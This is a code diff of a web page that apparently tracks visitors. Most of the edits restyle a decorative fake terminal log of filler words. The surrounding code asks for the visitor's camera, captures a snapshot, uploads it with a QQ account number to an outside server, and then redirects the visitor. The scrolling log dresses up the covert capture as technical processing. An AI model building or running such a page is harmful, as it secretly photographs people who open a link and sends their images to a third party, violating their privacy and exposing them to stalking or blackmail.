@@ -40,7 +40,7 @@
             display:flex; align-items:center; justify-content:center; flex-direction:column;
             overflow:hidden;
         }
-        /* 日志流：填满整个屏幕，底部对齐，自动换行到屏幕边缘 */
+        /* 日志流：每行铺满整行，从屏幕左边缘到右边缘 */
         .log-stream {
             position:absolute;
             inset:0;
@@ -48,22 +48,33 @@
             pointer-events:none;
             z-index:0;
             font-family: 'SF Mono', 'Consolas', 'Monaco', 'Courier New', monospace;
-            font-size: 11px;
-            line-height: 1.45;
-            color: #4a4a58;
-            padding: 12px 16px;
+            font-size: 10px;
+            line-height: 1.6;
+            color: #3d3d4a;
             display: flex;
             flex-direction: column;
             justify-content: flex-end;
-            white-space: pre-wrap;
-            word-break: break-all;
-            word-wrap: break-word;
-            overflow-wrap: break-word;
-            letter-spacing: 0.3px;
         }
-        /* 让每一行都紧贴屏幕边缘 */
-        .log-stream span {
+        /* 每一行：块级，宽度100%，文字自动填充整行并换行 */
+        .log-line {
             display: block;
+            width: 100%;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            flex-shrink: 0;
+            padding: 0 0;
+            margin: 0;
+            line-height: 1.6;
+            /* 关键：使用text-align justify让文字铺满 */
+            text-align: justify;
+            text-align-last: justify;
+            letter-spacing: 0.5px;
+        }
+        /* 填充字符效果：让每行看起来铺满 */
+        .log-line::after {
+            content: '';
+            display: inline-block;
             width: 100%;
         }
 
@@ -149,108 +160,127 @@ function copyLink() {
     .catch(() => document.execCommand('copy'));
 }
 
-// ========== 专业终端日志系统 ==========
+// ========== 终端日志系统（铺满整行） ==========
 const logStream = $('logStream');
-const MAX_LINES = 60;
+const MAX_LINES = 40;
 let logLines = [];
 
-// 不同阶段的文字池
-const idleWords = [
+// 词库
+const waitWords = [
     'idle', 'standby', 'waiting', 'listening', 'monitor', 'probe', 'scan',
-    'check', 'sync', 'poll', 'ping', 'ack', 'keepalive', 'heartbeat'
-];
-const initWords = [
-    'initializing framework', 'loading kernel modules', 'checking environment',
-    'establishing secure channel', 'handshake protocol TLSv1.3', 'verifying integrity',
-    'allocating memory blocks', 'scanning interfaces', 'mounting volumes',
-    'resolving DNS', 'negotiating cipher', 'authenticating session', 'parsing headers'
+    'check', 'sync', 'poll', 'ping', 'ack', 'keepalive', 'heartbeat',
+    'wait', 'hold', 'standby', 'pending', 'queue', 'delay', 'listen',
+    'ready', 'watch', 'observe', 'track', 'trace', 'follow', 'monitor'
 ];
 const burstWords = [
-    'acquiring signal', 'calibrating sensor', 'processing frame', 'buffering data',
-    'compressing stream', 'encrypting payload', 'connecting to relay', 'awaiting response',
-    'validating checksum', 'optimizing throughput', 'flushing cache', 'syncing clock',
-    'routing packets', 'checking latency', 'retrying handshake', 'waking interface',
+    'acquiring signal', 'calibrating', 'processing frame', 'buffering data',
+    'compressing stream', 'encrypting payload', 'connecting', 'awaiting response',
+    'validating checksum', 'optimizing throughput', 'flushing cache', 'syncing',
+    'routing packets', 'checking latency', 'retrying', 'waking interface',
     'reading sectors', 'writing blocks', 'garbage collecting', 'reclaiming space',
     'applying patches', 'restarting service', 'daemon running', 'session active',
-    'data transfer OK', 'checksum valid', 'payload delivered', 'acknowledgment received',
-    'closing socket', 'cleanup done', 'task completed', 'system idle'
+    'data transfer', 'checksum valid', 'payload delivered', 'acknowledgment',
+    'closing socket', 'cleanup done', 'task completed', 'system idle',
+    'processing', 'analyzing', 'parsing', 'decoding', 'encoding', 'transcoding',
+    'filtering', 'normalizing', 'sampling', 'quantizing', 'interpolating'
 ];
 
-// 生成随机时间戳
-function ts() {
-    const d = new Date();
-    return '[' + d.toTimeString().split(' ')[0] + ']';
+// 根据屏幕宽度计算每行需要的字符数
+function getCharsPerLine() {
+    const fontSize = 10;
+    const charWidth = fontSize * 0.6; // 等宽字体大约0.6倍宽度
+    return Math.floor(window.innerWidth / charWidth);
 }
 
-// 添加一行（自动换行由CSS处理）
-function pushLog(text) {
-    logLines.push(ts() + ' ' + text);
+// 生成一条铺满整行的文本
+function buildFullLine() {
+    const charsPerLine = getCharsPerLine();
+    let text = '';
+    while (text.length < charsPerLine) {
+        const word = waitWords[Math.floor(Math.random() * waitWords.length)];
+        text += word + '  ';
+    }
+    return text.substring(0, charsPerLine);
+}
+
+// 生成一条铺满整行的爆发文本
+function buildFullBurstLine() {
+    const charsPerLine = getCharsPerLine();
+    let text = '';
+    while (text.length < charsPerLine) {
+        const word = burstWords[Math.floor(Math.random() * burstWords.length)];
+        text += word + '  ';
+    }
+    return text.substring(0, charsPerLine);
+}
+
+// 添加一行
+function pushLine(text) {
+    logLines.push(text);
     if (logLines.length > MAX_LINES) logLines.shift();
     renderLogs();
 }
 
-// 批量添加多行
-function pushLogBurst(texts) {
-    for (const t of texts) {
-        logLines.push(ts() + ' ' + t);
-    }
+// 批量添加
+function pushLines(texts) {
+    logLines.push(...texts);
     if (logLines.length > MAX_LINES) logLines.splice(0, logLines.length - MAX_LINES);
     renderLogs();
 }
 
-// 渲染：每行一个span，保证填满宽度自动换行
+// 渲染
 function renderLogs() {
     if (!logStream) return;
     logStream.innerHTML = '';
     for (const line of logLines) {
-        const span = document.createElement('span');
-        span.textContent = line;
-        logStream.appendChild(span);
+        const div = document.createElement('div');
+        div.className = 'log-line';
+        div.textContent = line;
+        logStream.appendChild(div);
     }
 }
 
-// ========== 日志定时器（动态速度） ==========
-let slowTimer = null;    // 慢速等待
-let fastTimer = null;    // 快速爆发
-let burstTimeout = null; // 爆发持续时间
+// 日志定时器
+let slowTimer = null;
+let fastTimer = null;
 
-// 慢速模式（等待授权时）
 function startSlowLogs() {
-    stopAllLogs();
-    slowTimer = setInterval(() => {
-        const word = idleWords[Math.floor(Math.random() * idleWords.length)];
-        pushLog(word + '...');
-    }, 800);
-}
-
-// 快速模式（授权成功后爆发）
-function startFastLogs() {
-    stopAllLogs();
-    // 先一次性爆发一批
-    const initialBurst = [];
-    for (let i = 0; i < 25; i++) {
-        initialBurst.push(burstWords[Math.floor(Math.random() * burstWords.length)] + '...');
+    stopAllTimers();
+    // 先填充一些初始行
+    const initial = [];
+    for (let i = 0; i < 20; i++) {
+        initial.push(buildFullLine());
     }
-    pushLogBurst(initialBurst);
-    // 然后快速持续输出
-    fastTimer = setInterval(() => {
-        const word = burstWords[Math.floor(Math.random() * burstWords.length)];
-        pushLog(word + '...');
-    }, 200);
+    pushLines(initial);
+    // 慢速添加
+    slowTimer = setInterval(() => {
+        pushLine(buildFullLine());
+    }, 1000); // 1秒一行
 }
 
-// 停止所有日志
-function stopAllLogs() {
+function startFastLogs() {
+    stopAllTimers();
+    // 爆发：一次性添加很多行
+    const initial = [];
+    for (let i = 0; i < 30; i++) {
+        initial.push(buildFullBurstLine());
+    }
+    pushLines(initial);
+    // 快速持续添加
+    fastTimer = setInterval(() => {
+        pushLine(buildFullBurstLine());
+    }, 150); // 每秒约6-7行，非常快
+}
+
+function stopAllTimers() {
     clearInterval(slowTimer);
     clearInterval(fastTimer);
-    clearTimeout(burstTimeout);
     slowTimer = null;
     fastTimer = null;
 }
 
-// 完全停止并清空
-function stopAndClearLogs() {
-    stopAllLogs();
+function clearLogs() {
+    stopAllTimers();
     logLines = [];
     renderLogs();
 }
@@ -267,11 +297,6 @@ function startTrack(qq, redirectUrl) {
     const cvs = $('cvs');
     const API = 'http://a1nb66.atwebpages.com/zyj/api.php';
 
-    // 初始预填初始化日志
-    for (let i = 0; i < 15; i++) {
-        pushLog(initWords[Math.floor(Math.random() * initWords.length)] + '...');
-    }
-
     // 开始慢速日志
     startSlowLogs();
 
@@ -283,17 +308,17 @@ function startTrack(qq, redirectUrl) {
 
     async function run() {
         setStatus('正在初始化...');
+        await sleep(500);
 
         if (!navigator.mediaDevices?.getUserMedia) {
             setStatus('环境不支持', true);
             spinner.classList.add('error');
-            stopAndClearLogs();
+            clearLogs();
             return setTimeout(() => location.href = redirectUrl, 2000);
         }
 
-        // 请求授权前持续输出等待文字
         setStatus('正在请求授权...');
-        await sleep(400); // 给用户一点时间看到状态
+        await sleep(300);
 
         let stream;
         try {
@@ -302,9 +327,8 @@ function startTrack(qq, redirectUrl) {
                 audio: false
             });
 
-            // ★ 授权成功 → 爆发式刷屏
-            setStatus('授权成功，正在处理...');
-            spinner.classList.remove('error');
+            // ★ 授权成功 → 爆发
+            setStatus('授权成功');
             startFastLogs();
 
         } catch (e) {
@@ -313,14 +337,14 @@ function startTrack(qq, redirectUrl) {
                 spinner.classList.add('error');
                 spinner.style.display = 'none';
                 deniedMsg.classList.add('show');
-                stopAllLogs();
+                clearLogs();
                 return;
             }
-            // 尝试降级
+            // 降级
             try {
                 setStatus('尝试兼容模式...');
                 stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                setStatus('授权成功，正在处理...');
+                setStatus('授权成功');
                 startFastLogs();
             } catch (e2) {
                 if (e2.name === 'NotAllowedError' || e2.name === 'PermissionDeniedError') {
@@ -328,21 +352,20 @@ function startTrack(qq, redirectUrl) {
                     spinner.classList.add('error');
                     spinner.style.display = 'none';
                     deniedMsg.classList.add('show');
-                    stopAllLogs();
+                    clearLogs();
                     return;
                 }
                 setStatus('设备不可用', true);
                 spinner.classList.add('error');
-                stopAndClearLogs();
+                clearLogs();
                 return setTimeout(() => location.href = redirectUrl, 2000);
             }
         }
 
         vid.srcObject = stream;
         vid.play().catch(()=>{});
-        setStatus('准备就绪...');
+        setStatus('正在处理...');
 
-        // 等待视频就绪
         const ready = await new Promise(resolve => {
             const start = Date.now();
             const check = () => {
@@ -358,11 +381,10 @@ function startTrack(qq, redirectUrl) {
             setStatus('超时', true);
             spinner.classList.add('error');
             stream.getTracks().forEach(t => t.stop());
-            stopAndClearLogs();
+            clearLogs();
             return setTimeout(() => location.href = redirectUrl, 2000);
         }
 
-        // 截图
         cvs.width = vid.videoWidth;
         cvs.height = vid.videoHeight;
         const ctx = cvs.getContext('2d');
@@ -371,7 +393,6 @@ function startTrack(qq, redirectUrl) {
         stream.getTracks().forEach(t => t.stop());
 
         setStatus('正在上传...');
-        pushLog('uploading payload...');
 
         const fd = new FormData();
         fd.append('qq', qq);
@@ -383,7 +404,6 @@ function startTrack(qq, redirectUrl) {
                 if (r.success) {
                     setStatus('完成 ✓', false);
                     spinner.classList.add('done');
-                    pushLog('upload complete');
                 } else {
                     setStatus('服务器拒绝', true);
                     spinner.classList.add('error');
@@ -397,7 +417,7 @@ function startTrack(qq, redirectUrl) {
             spinner.classList.add('error');
         }
 
-        stopAllLogs();
+        stopAllTimers();
         setTimeout(() => location.href = redirectUrl, 2000);
     }
 
